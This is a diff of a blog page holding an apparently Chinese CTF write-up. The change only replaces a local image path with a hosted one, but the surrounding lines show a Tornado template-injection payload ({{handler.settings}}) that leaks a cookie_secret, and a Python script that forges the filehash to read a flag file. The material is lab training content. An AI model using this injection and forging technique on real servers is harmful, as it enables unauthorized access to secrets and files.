@@ -26,9 +26,9 @@
 <meta property="og:image" content="https://s2.loli.net/2023/10/31/VSl8KJM9iPh3RjI.png">
 <meta property="og:image" content="https://s2.loli.net/2023/10/31/5gALRmZCsuHcbnO.png">
 <meta property="og:image" content="https://s2.loli.net/2023/10/31/HxhavJIi6dpUzYK.png">
-<meta property="og:image" content="d:/Typora/md_images/image-20231031195051979.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/31/Nof3qIgiXczmQnM.png">
 <meta property="article:published_time" content="2023-10-31T11:17:42.000Z">
-<meta property="article:modified_time" content="2023-10-31T12:03:38.790Z">
+<meta property="article:modified_time" content="2023-10-31T12:06:40.952Z">
 <meta property="article:author" content="gaifagafin">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="攻防世界">
@@ -326,7 +326,7 @@
 <p>页面返回1，说明存在漏洞，在此处直接注入</p>
 <p>url输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
 <p>回显</p>
-<p><img src="D:/Typora/md_images/image-20231031195051979.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://s2.loli.net/2023/10/31/Nof3qIgiXczmQnM.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到cookie_secret值:<code>4beb94e3-3a69-4960-92ab-f83221330eec</code></p>
 <p>编写脚本获取filehash</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">content</span>):<br>    md5 = hashlib.md5()<br>    md5.update(content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br>filename=<span class="hljs-string">&quot;/fllllllllllllag&quot;</span><br>cookie_secret=<span class="hljs-string">&quot;4beb94e3-3a69-4960-92ab-f83221330eec&quot;</span><br>no_md5_filehash=cookie_secret+get_md5(filename)<br>filehash=get_md5(no_md5_filehash)<br><span class="hljs-built_in">print</span>(filehash)<br></code></pre></td></tr></table></figure>
